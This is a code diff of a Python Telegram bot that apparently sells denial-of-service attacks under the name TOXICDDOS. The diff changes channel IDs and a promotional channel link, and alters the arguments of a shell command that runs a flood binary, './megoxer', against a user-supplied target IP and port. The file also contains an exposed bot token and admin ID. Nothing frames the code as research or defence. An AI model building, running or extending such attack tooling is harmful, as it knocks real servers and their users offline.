@@ -10,7 +10,7 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 # Telegram bot token and channel ID
 TOKEN = '7917194216:AAEFLgMZXXxR05rJ4Y1Ah9qZKa1XcGDfRmE'  # Replace with your actual bot token
 ADMIN_IDS = [6882674372]  # Added new admin ID
-CHANNEL_ID = '-1002252002504' # Replace with your specific channel or group ID
+CHANNEL_ID = '-1002431196846' # Replace with your specific channel or group ID
 # Initialize the bot
 bot = telebot.TeleBot(TOKEN)
 
@@ -148,7 +148,7 @@ def reset_attack_limit(message):
 
 # Handler for photos sent by users (feedback received)
 # Define the feedback channel ID
-FEEDBACK_CHANNEL_ID = "-1002431196846"  # Replace with your actual feedback channel ID
+FEEDBACK_CHANNEL_ID = "-1002252002504"  # Replace with your actual feedback channel ID
 
 # Store the last feedback photo ID for each user to detect duplicates
 last_feedback_photo = {}
@@ -214,8 +214,8 @@ def handle_photo(message):
 verified_users = set()
 
 # Private channel username (not ID)
-PRIVATE_CHANNEL_USERNAME = "APNA_BHAI_DILDOS"  # Example: "MyPrivateChannel"
-PRIVATE_CHANNEL_LINK = "https://t.me/APNA_BHAI_DILDOS"  # Replace with actual link
+PRIVATE_CHANNEL_USERNAME = "𝐓𝐎𝐗𝐈𝐂 𝐕𝐈𝐏 𝐃𝐃𝐎𝐒⚡️"  # Example: "MyPrivateChannel"
+PRIVATE_CHANNEL_LINK = "https://t.me/ddosserverfreeze"  # Replace with actual link
 
 # ✅ Command to verify after joining
 @bot.message_handler(commands=['verify'])
@@ -395,7 +395,7 @@ def bgmi_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
     try:
-        command = f"./megoxer {target_ip} {target_port} {duration} 500"
+        command = f"./megoxer {target_ip} {target_port} {duration} 9 900"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
         bot.send_message(CHANNEL_ID, f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> TOXICDDOS")
